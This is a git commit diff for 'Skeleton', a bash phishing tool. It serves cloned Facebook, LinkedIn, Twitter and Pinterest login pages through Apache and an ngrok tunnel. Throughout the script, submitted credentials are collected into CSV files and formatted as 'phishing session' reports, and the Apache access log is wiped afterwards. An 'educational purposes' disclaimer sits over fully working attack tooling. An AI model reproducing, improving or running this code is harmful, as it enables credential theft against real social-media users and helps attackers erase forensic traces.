6e89ddd4198c99aaa7db9066ca1976ff078d7da7
KURO <kurocode404@gmail.com>
2018-03-28 20:59:59 +0200

    Skeleton 1.1

--- skeleton.sh
+++ skeleton.sh
@@ -1,9 +1,16 @@
 #!/bin/bash
 
 #~~~ INFO ~~~
-#**********************
 #
-# Name: Skeleton-Key
+# Skeleton is a Social Engineering tool attack switcher
+# Type: Phishing Tool
+# Target: Facebook, Linkedin, Twitter, Pinterest
+#
+# DISCLAMER: Program for educational purposes!!!
+# 
+#***********************************************************
+#
+# Name: Skeleton
 # Version: 1.0 beta
 # Dev: Shell
 # Language: En        
@@ -11,19 +18,43 @@
 # Author: KURO-CODE   
 #
 #**********************
+#**********************
+#
+# Name: Skeleton
+# Version: 1.0 beta
+# Dev: Shell
+# Language: En        
+# Date: 03/28/2018   
+# Author: KURO-CODE   
+#
+# -Attack Switcher BugFix
+# -Exit (Revision)
+#
+#**********************
 
+#**** Skeleton version ****
+VERSION="1.1"
+
+#**** Screen size ****
 resize -s 25 60 > /dev/null
 
-#~~~ Check Root ~~~
-if [ $(id -u) != "0" ]; then
-  echo -e "$W [$R""X$W]$GR...$R""Y$W""ou are not $R""Root$W!
- $G""U$W""se:$Y sudo ./skeleton.sh or chmod +x skeleton.sh$EC"
-else
-    echo -e "$W [$R""X$W]$GR...$R""C$W""lose" 
-fi
+#**** Check Root ****
+function check_root_perm() {
+	user=$(whoami)
+	if [ "$user" = "root" ]; then
+  		echo -e "$W [$G""X$W]$GR...$G""Y$W""ou are $G""Root$W!"
+  		sleep 1
+  		RUN
+	else
+		echo -e "$W [$R""X$W]$GR...$R""Y$W""ou are not $R""Root$W!
+ $G""U$W""se:$Y sudo ./skeleton.sh$EC"
+ 		sleep 1
+    	echo -e "$W [$R""X$W]$GR...$R""C$W""lose" 
+    	sleep 1
+	fi
+}
 
-#~~~ CONFIG ~~~
-
+#**** CONFIG ****
 IMG_PATH="img"
 TMP="/var/www/html"
 SITE="site/$site/$lang/index.html"
@@ -31,7 +62,7 @@ SYSTM32="ngrok"
 SYSTEM64="ngrok_64"
 SKELEDIAL="  SkEleToN~KeY: "
 
-#~~~ Color ~~~
+#**** Color ****
 CL="\033[0;7m"
 W="\033[1;37m"
 GR="\033[0;37m"
@@ -42,24 +73,23 @@ B="\033[1;34m"
 M="\033[1;35m"
 EC="\033[0m"
 
-#~~~ Display ~~~
+#**** Display ****
 DISPLAY_LOG="-geometry 40x5+800+0"
 DISPLAY_SERV="-geometry 80x10+600-300"
 DISPLAY_KEY="-geometry 80x21+600-0"
 
-#~~~ TOP MENU SELECT ~~~
+#**** TOP MENU SELECT ****
 MENU_main="$W~ Main Menu ~$EC"
 MENU_info="$W~ I N F O ~"
 MENU_skel="$W~ Skeleton menu ~"
 MENU_skel1="$B""S$W""E$GR""le$W""CT"
 MENU_skel2="Select an attack"
 
-
 #~~~ START ~~~
 function RUN {
-
+	Place="Run"
 	clear
-	top
+	FLAG
 	sleep 1
 	echo -e "
 	  $B ***********************************
@@ -68,17 +98,16 @@ function RUN {
 	   ***********************************$EC
 "
 	sleep 3
-
 main
 }
 
 function main {
-
+	Place="MAIN"
 	clear
-	top
+	FLAG
 	echo
 	echo -e "
-	   $MENU_main
+	    $MENU_main
          $B""o$W-----------------$B""o$W
          |  1$W)$GR...$B""I$GR""n$W""f$GR""o$W      |
          |  2$W)$GR...$B""S$W""k$GR""e$W""le$GR""to$W""n  |
@@ -92,13 +121,13 @@ function main {
 	0) EXITMODE;;
 	*) echo -e "$CL$R[ERROR]$EC"; sleep 2; main;;
 esac
-
 }
 
+#~~~~ Attack Selection ~~~~
 function select_attack {
-
+	place="Sel_Attack"
 	clear
-	top
+	FLAG
 	echo
 	echo -e " 
                 ~ $W$MENU_skel2 ~
@@ -111,7 +140,6 @@ function select_attack {
          $B""o$W--------------------------------$B""o$EC      
 "	 
 	read -p "$SKELEDIAL" site
-
 	case $site in
 	1)
 	site="facebook"
@@ -122,7 +150,6 @@ function select_attack {
 	    else
 		lang 
 	    fi ;;
-
 	2)
 	site="linkedin"
 	    if [ ! -d "sites/linkedin" ]; then
@@ -132,7 +159,6 @@ function select_attack {
 	    else
 		lang 
 	    fi ;;
-
 	3)
 	site="twitter"
 	    if [ ! -d "sites/twitter" ]; then
@@ -142,7 +168,6 @@ function select_attack {
 	    else
 		lang 
 	    fi ;;
-
 	4)
 	site="pinterest"
 	    if [ ! -d "sites/pinterest" ]; then
@@ -152,22 +177,17 @@ function select_attack {
 	    else
 		lang 
 	    fi ;;
-
-
 	9) echo -e " [*]...Back" ; main ;;
-
 	0) EXITMODE ;;
-
 	*) echo -e "$CL$R[ERROR]$EC"; sleep 3; select_attack ;;
-
 esac
-
 }
 
+#~~~~ Attack Language ~~~~
 function lang {
+		Place="Lang"
 	        clear
-	        top
-		
+	        FLAG
                 echo -e "
        ~ Select language attack ~ 
       
@@ -183,14 +203,12 @@ function lang {
 			1)
 	    		  if [ ! -f "sites/$site/en/index.html" ]; then
 	        	  	echo -e " $W[$Y!$W]$GR...$R""N$W""ot Exist$EC"
-				echo -e "$site"
+					echo -e "$site"
 	        	  	sleep 2
 	        	  	select_attack
 	    		  else
-				
- 
-				clear
-	                  	top
+						clear
+	                  	FLAG
 	                  	echo -e " 
  $W[$G*$W]$GR...$G$site$W"
 	                  	sleep 0.5
@@ -201,7 +219,6 @@ function lang {
 	                  	sleep 3
 	                  	set_serv
 	    		  fi ;;
-
 			2)
 	    		  if [ ! -f "sites/$site/fr/index.html" ]; then
 	        	  	echo -e " $W[$Y!$W]$GR...$R""N$W""ot Exist$EC"
@@ -210,7 +227,7 @@ function lang {
 	        	  	select_attack
 	    		  else
 				clear
-	                  	top
+	                  	FLAG
 	                  	echo -e " 
  $W[$G*$W]$GR...$G$site$W"
 	                  	sleep 0.5
@@ -220,20 +237,15 @@ function lang {
                           	cp -a sites/$site/fr/index.html /var/www/html/index.html
 	                  	sleep 2
 	                  	set_serv
-	    		  fi ;;
-	
-
-	                9) echo -e "$W[$R*$W]$GR...$W""Back" ; sleep 2 ; main ;; 
-	
-	 
-			*) echo -e "$CL$R[ERROR]$EC"; sleep 3; lang ;; 
-			
+	    		  fi ;;	
+	                9) echo -e "$W[$R*$W]$GR...$W""Back" ; sleep 2 ; main ;; 		 
+			*) echo -e "$CL$R[ERROR]$EC"; sleep 3; lang ;; 			
 esac
 }
 
-
+#~~~~ Set Server ~~~~
 function set_serv {
-
+	Place="Set_Serv"
 	echo "#!/bin/bash
 
 function rep {
@@ -263,10 +275,9 @@ rep" > key.sh
 chmod +x key.sh
 	service apache2 start
 	sleep 1
-	xterm -title "Skeleton Control" $DISPLAY_LOG -bg "#000000" -fg "#11ff00" -e "tail -f /var/log/apache2/access.log > sk_tmp.csv" &
-        xterm -title "Skeleton Key" $DISPLAY_KEY -e "./key.sh" &
+    xterm -title "Skeleton Key" $DISPLAY_KEY -e "./key.sh" &
 	clear
-	top
+	FLAG
 	echo -e " 
 	$W~ S$GR""e$W""T sE$GR""r$W""Ve$GR""r$W ~
 	$B""o$W------------$B""o$W
@@ -285,38 +296,34 @@ chmod +x key.sh
 	  chmod +x $SYSTM32
 	  xterm -title "Skeleton Server Log" $DISPLAY_SERV -e ./$SYSTM32 http 80 &
 	  sleep 2
-
-         control
+      control
 
 	elif [ "$setserv" -eq "2" ]; then
-            echo -e "$W[$R+$W] Start service 64bit..."
-	    service apache2 start
+        echo -e "$W[$R+$W] Start service 64bit..."
 	    sleep 2
-	    chmod +x $SYSTM64
-	    xterm -title "Skeleton Server Log" $DISPLAY_SERV -e ./$SYSTM64 http 80 &
+	    chmod +x $SYSTEM64
+	    xterm -title "Skeleton Server Log" $DISPLAY_SERV -e ./$SYSTEM64 http 80 &
 	    sleep 2
-	    echo -e "$W[$R+$W] Attack ok!"
-	    clear
-	    top
+	    control
 
-	    xterm -title "Skeleton Control" $DISPLAY_LOG -bg "#000000" -fg "#11ff00" -e "tail -f /var/log/apache2/access.log > sk_tmp.csv" &
 	    xterm -title "Skeleton Key" $DISPLAY_KEY -e "./key.sh" &
-            set_serv
+        set_serv
+
 	elif [ "$setserv" -eq "3" ]; then
-	control
+		control
 
 	else
 	    echo -e "$CL$R[ERROR]$EC" 
 	    sleep 2 
 	    set_serv 
-	fi
-	
+	fi	
 }
 
+#~~~~ Control Menu ~~~~
 function control {
-
+	Place="Control"
 	clear
-	top
+	FLAG
 	echo -e "
         ~ Control attack switcher~
       $B""o$W----------------------------$B""o$W
@@ -329,29 +336,26 @@ function control {
 	read -p "$SKELEDIAL" opt
  
 	case $opt in
-	1) KILL_attack;;
-
-	2) cat $site.csv > $site.txt; pkill key.sh; sleep 1; pkill tail; rm -f key.sh; rm -f $site.csv; service apache2 stop; rm -f /var/log/apache2/access.log; select_attack;;
-
+	1) report; Kill_Process; Kill_Services; Clean_TMP; main;;
+	2) report; pkill key.sh; Clean_TMP; pkill tail; Kill_Services; select_attack;;
 	3) main;;
 	0) EXITMODE;;
 	*) echo -e "$CL$R[ERROR]$EC"; sleep 2; control;;
 esac
 }
 
-
-
+#~~~~ INFO ~~~~
 function inf {
-
+	Place="Info_Menu"
 	clear
-	top
+	FLAG
 	echo
 	echo -e " 
 	         $MENU_info
 	  $B""o$W------------------------$B+
 	  $W|$CL$G Name:....Skeleton Key  $EC$W|
 	  $W|$CL$G Dev:.....Bash          $EC$W|
-	  $W|$CL$G Ver:.....1.0 beta      $EC$W|
+	  $W|$CL$G Ver:.....$VERSION           $EC$W|
 	  $W|$CL$G Date:....08/14/2017    $EC$W|
 	  $W|$CL$G Author:..Kuro-code     $EC$W|
 	  $W|$CL$G Info:....Phishing tool $EC$W|
@@ -365,70 +369,107 @@ function inf {
 main
 }
 
-function KILL_attack {
-
+#~~~~ Report ~~~~
+function report {
+	Place"report"
 	clear
-	top
+	FLAG
 	echo -e "
- $W[$R*$W]$GR...$W""Stop attack$GR...$W[$R*$W]"
-	cat $site.csv > $site.txt
-	sleep 0.2
-	echo -e " $W[$G+$W]$GR Close services."
-	sleep 0.1
-	echo -e " $W[$G+$W]$GR Shutdow Apache."
-	service apache2 stop
-	sleep 1
-	echo -e " $W[$G+$W]$GR Kill process... "
-	pkill key.sh
-	sleep 0.2
-	pkill $SYSTM32
-	sleep 0.2
-	pkill tail
-	echo -e " $W[$G+$W]$GR Clean temporary files."
-	rm -f /var/log/apache2/access.log
-	rm -f key.sh
-	sleep 0.2
-	rm -f *.csv
-	sleep 1
-main
+$W[$R*$W]$GR...$W""Stop attack$GR...$W[$R*$W]"
+	RPRT=`cat $site.csv` 
+	Date=`date +%D`
+	echo -e "
+   ~ $site Phishing Session ~
+***********************************
+$Date
+
+$RPRT
+
+===============================
+  $SKELEDIAL 2018
+===============================
+  " > $site.txt
 
 }
 
+#~~~~ Exit ~~~~
 function EXITMODE {
-
 	clear
-	top
+	FLAG
 	echo
 	echo -e "
-	$CL ""Thanks for use Skeleton-Key $EC
-"
-	echo -e "$W[$G+$W]$GR Close services."
-	sleep 0.2
-	echo -e "$W[$G+$W]$GR Shutdown Apache."
-	service apache2 stop
-	sleep 2
-	pkill $SYSTM32
-	pkill tail
-	pkill key.sh
-	rm -f key.sh
-	rm -f *.csv
-	echo -e "$W[$G+$W]$GR Clean temporary files"
-	rm -f $TMP/index.html
-	rm -f /var/log/apache2/access.log
+	$CL ""Thanks for use Skeleton-Key $EC"
 	sleep 3
 	clear
 	exit
 }
 
+#~~~~ Function Kill ~~~~
+function Kill_Services() {
+	echo -e "
+$W[$G+$W]$GR Close services."
+	sleep 0.1
+	echo -e "
+$W[$G+$W]$GR Shutdow Apache."
+	service apache2 stop
+	sleep 1
+}
 
-function top {
+function Kill_Process() {
+	echo -e "
+$W[$G+$W]$GR Kill process... "
+	pkill key.sh
+	sleep 0.2
+	pkill $SYSTM32
+	sleep 0.2
+	pkill tail
+	sleep 1
+}
+
+#~~~~ CLEAN TMP ~~~~
+function Clean_TMP() {
+	echo -e "
+$W[$G+$W]$GR Clean temporary files"
+	rm -f $TMP/index.html
+	sleep 0.2
+	rm -f /var/log/apache2/access.log
+	sleep 0.2
+	rm -f key.sh
+	sleep 0.2
+	rm -f *.csv
+	sleep 0.2
+}
+
+#~~~~ FLAG ~~~~
+function FLAG {
 
 	echo -e "$B  _______$W __          __       __                  
  $B|   _   |$W  |--.-----|  .-----|  |_.-----.-----.   
  $B|   1___|$W    <|  -__|  |  -__|   _|  _  |     |   
  $B|____   |$W""__|__|_____|__|_____|____|_____|__|__|   
  $B|:  1   |                                         
- $B|_______|     $W""Social engineering tool$GE v1.0$EC "
+ $B|_______|     $W""Social engineering tool$GE v$VERSION$EC "
 
 }
-RUN
+
+#~~~~ Hard Exit ~~~~
+function cap_traps() {
+
+	case $Place in
+		"Run") clear; EXITMODE;;
+		"MAIN") clear; EXITMODE;;
+		"Sel_Attack") clear; FLAG; Clean_TMP; EXITMODE;;
+		"Info_Menu") clear; EXITMODE;;
+		"Lang") clear; FLAG; Clean_TMP; EXITMODE;;
+		"Set_Serv") clear; FLAG; Clean_TMP; EXITMODE;;
+		"Control") clear; FLAG; Kill_Process; Kill_Services; Clean_TMP; EXITMODE;;
+	esac 
+}
+
+for x in SIGINT SIGHUP INT SIGTSTP; do
+	trap_cmd="trap \"cap_traps $x\" \"$x\""
+	eval "$trap_cmd"
+done
+
+#### START ####
+check_root_perm
